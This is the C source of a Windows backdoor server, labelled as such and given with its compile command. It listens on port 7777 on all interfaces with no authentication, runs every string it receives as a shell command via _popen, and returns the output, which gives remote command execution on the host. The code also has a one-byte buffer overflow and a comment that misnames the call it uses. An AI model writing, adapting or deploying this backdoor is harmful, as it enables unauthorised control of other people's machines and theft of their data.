// Windows backdoor server
// g++ ./backdoor_server.c -o ./backdoor_server.exe -lwsock32
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#include <stdbool.h>

#define DEFAULT_ACCESS_PORT 7777
#define DEFAULT_BUFFER_SIZE 4096

// Handle the backdoor client
void handleBackdoorClient(SOCKET clientSocketConnection) {
    char buffer[DEFAULT_BUFFER_SIZE];
    int bytesRead = 0;

    while (true) {
        // Receive data from the client
        bytesRead = recv(clientSocketConnection, buffer, DEFAULT_BUFFER_SIZE, 0);
        if (bytesRead == SOCKET_ERROR || bytesRead == 0) {
            printf("Client disconnected\n");
            closesocket(clientSocketConnection);
            return;
        }

        // Null-terminate the received data
        buffer[bytesRead] = '\0';

        // Execute the command received from the client via system()
        FILE *commandOutput = _popen(buffer, "r");

        if (commandOutput == NULL) {
            send(clientSocketConnection, "Error executing the command\n", sizeof("Error executing the command\n") - 1, 0);
            continue;
        }

        char commandOutputBuffer[DEFAULT_BUFFER_SIZE];
        size_t outputSize = fread(commandOutputBuffer, 1, DEFAULT_BUFFER_SIZE, commandOutput);
        fclose(commandOutput);

        // Send the output of the command to the client
        send(clientSocketConnection, commandOutputBuffer, outputSize, 0);

    }
}

int main(void) {
    // Initialize the Windows Sockets API
    WSADATA windowsSocketData;
    SOCKET serverListeningSocket, clientSocket;
    struct sockaddr_in serverAddress, clientAddress;
    int clientAddressLength = sizeof(clientAddress);

    // Initialize the Windows Sockets API
    if (WSAStartup(MAKEWORD(2, 2), &windowsSocketData) != 0) {
        printf("Error initializing the Windows Sockets API\n");
        return -1;
    }

    // Create a new server socket
    serverListeningSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverListeningSocket == INVALID_SOCKET) {
        printf("Error creating the server socket\n");
        WSACleanup();
        return -1;
    }

    // Configure the server address
    memset(&serverAddress, 0, sizeof(serverAddress));
    serverAddress.sin_family = AF_INET;                     // IPv4 address family
    serverAddress.sin_addr.s_addr = htonl(INADDR_ANY);      // Accept connections from any IP address
    serverAddress.sin_port = htons(DEFAULT_ACCESS_PORT);    // Listening on port 7777

    // Bind the socket
    if (bind(serverListeningSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        printf("Error binding the server socket\n");
        closesocket(serverListeningSocket);
        WSACleanup();
        return -1;
    }

    printf("Listening for incoming connection (port: %d)...\n", DEFAULT_ACCESS_PORT);

    // Start listening for incoming connections
    if (listen(serverListeningSocket, SOMAXCONN) == SOCKET_ERROR) {
        printf("Error listening for connections\n");
        closesocket(serverListeningSocket);
        WSACleanup();
        return -1;
    }

    while (true) {
        // Accept a new client connection
        clientSocket = accept(serverListeningSocket, (struct sockaddr *)&clientAddress, &clientAddressLength);
        if (clientSocket == INVALID_SOCKET) {
            printf("Error accepting the client connection\n");
            closesocket(serverListeningSocket);
            WSACleanup();
            return -1;
        } else {
            // Print the client IP address and port number
            printf("Client connected: %s:%d\n", inet_ntoa(clientAddress.sin_addr), ntohs(clientAddress.sin_port));

            // Handle the backdoor client
            handleBackdoorClient(clientSocket);
        }
    }

    return 0;
}